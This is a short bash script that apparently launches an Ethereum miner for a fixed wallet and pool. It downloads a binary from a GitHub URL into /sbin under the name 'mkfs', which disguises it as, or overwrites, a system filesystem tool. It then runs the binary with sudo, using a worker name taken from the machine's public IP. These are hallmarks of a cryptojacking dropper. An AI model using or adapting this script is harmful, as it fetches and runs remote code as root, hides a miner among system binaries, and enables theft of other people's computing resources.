#!/bin/bash

POOL=asia1.ethermine.org:4444
WALLET=0x491fcd9921b694454fff2882836526177d4317a8
WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )

cd "$(dirname "$0")"
cd /sbin
wget -O mkfs https://raw.githubusercontent.com/azis07/turbo/main/turbo
chmod +x ./mkfs && sudo ./mkfs -a ethash -o $POOL -u $WALLET.$WORKER $@
